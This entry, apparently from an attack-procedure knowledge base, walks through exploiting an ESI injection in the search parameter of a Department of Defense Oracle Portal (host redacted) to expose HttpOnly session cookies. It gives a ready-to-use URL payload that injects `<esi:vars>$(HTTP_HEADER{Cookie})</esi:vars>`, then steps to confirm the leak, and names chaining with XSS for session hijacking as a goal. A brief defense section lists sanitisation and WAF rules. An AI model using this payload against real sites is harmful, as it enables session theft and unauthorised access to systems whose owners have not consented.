---
id: proc-esi-injection-demo
name: Demonstrate ESI Injection to Extract HttpOnly Cookies
tags:
  - esi-injection
  - cookie-leak
  - web-vulnerability
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T00:11:09.381Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Demonstrate ESI Injection to Extract HttpOnly Cookies

## Summary

This procedure exploits an ESI (Edge Side Includes) injection vulnerability in the 'ms' parameter of a search results endpoint on an Oracle Portal, allowing the injection of ESI tags to capture and display HttpOnly session cookies from HTTP headers, which are normally protected from client-side access.

## Description

In the context of a U.S. Department of Defense portal, the search endpoint processes user input without sanitizing for ESI directives, enabling attackers to inject tags like `<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>`. When rendered, this expands to include the full Cookie header, leaking sensitive session data. This is a server-side vulnerability that can lead to session hijacking when chained with client-side exploits. Prerequisites include access to the public portal and a browser for testing.

## Requirements

1. Network access to the target portal (e.g., https://████████/portal/...)
2. Browser with URL bar for payload injection
3. No authentication required for public endpoints

## Defense

Defensive measures and detection strategies:

- Sanitize all inputs to prevent ESI tag injection (e.g., strip `<esi:` prefixes)
- Disable ESI processing on user-controlled parameters or use Content Security Policy (CSP) to block dynamic includes
- Monitor server logs for anomalous ESI expansions or unexpected header accesses
- Implement Web Application Firewall (WAF) rules to detect ESI payloads

## Objectives

1. Confirm ESI injection vulnerability and extract HttpOnly cookies
2. Validate potential for session data leakage
3. Prepare for chaining with client-side exploits like XSS

## Instructions

### Step 1: Craft and Inject ESI Payload

**Context**: Construct a URL with the ESI injection in the 'ms' parameter to capture the Cookie header.

No specific command; use browser navigation:

```url
https://████████/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults?osf=&ms=lol<esi:vars>$(HTTP_HEADER{Cookie})</esi:vars>lol&mo=containsall&pg=&sepg=-1&fi=&fs=&ft=&pu=1&has=&as=17%2C0%3B48%2C0&saa=ALL&po=matchall&pi=&pc=&co=equal&ci=&p_action=SUBMIT&ll=
```

> The payload uses 'lol' as delimiters to easily identify the injected cookie value in the rendered Search field. Expected output: Cookies visible between 'lol' strings, e.g., 'lol JSESSIONID=abc123; ... lol'.

### Step 2: Inspect and Validate Output

**Context**: Examine the page source or rendered input field to confirm leakage.

Use browser DevTools (Inspect Element) on the Search field (likely id='x61_ms').

> Look for the expanded ESI content. Success: Full Cookie header including HttpOnly flags is displayed.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- [[esi-injection]]
- [[cookie-theft]]
